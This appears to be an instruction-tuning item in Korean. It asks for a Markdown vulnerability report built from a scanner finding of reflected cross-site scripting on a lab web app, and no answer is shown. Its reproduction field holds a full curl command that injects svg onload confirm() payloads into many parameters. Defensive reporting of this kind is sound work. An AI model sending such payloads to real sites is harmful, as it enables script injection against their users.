instruction:
다음 입력으로 Markdown 취약점 블록을 생성하라.
규칙: Markdown만, 헤딩은 ##만, 이모지/표 금지, 한 줄 불릿.
출력은 한국어로 작성.
모든 항목(End-Point/영향/설명/근거/대응/조치)을 반드시 출력.
근거는 증거/재현에서만 요약, 부족 시 '-' 사용.
input:
입력:
제목: Fuzzing Parameters - Cross-Site Scripting
심각도: MEDIUM
카테고리: XSS
엔드포인트: http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/, http://192.168.64.2:9991/www/XSS/XSS_level2.php/ 외 2개
CVE: N/A
설명: Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.
영향: N/A
증거: 
재현: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.15' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E'
대응/조치 힌트:
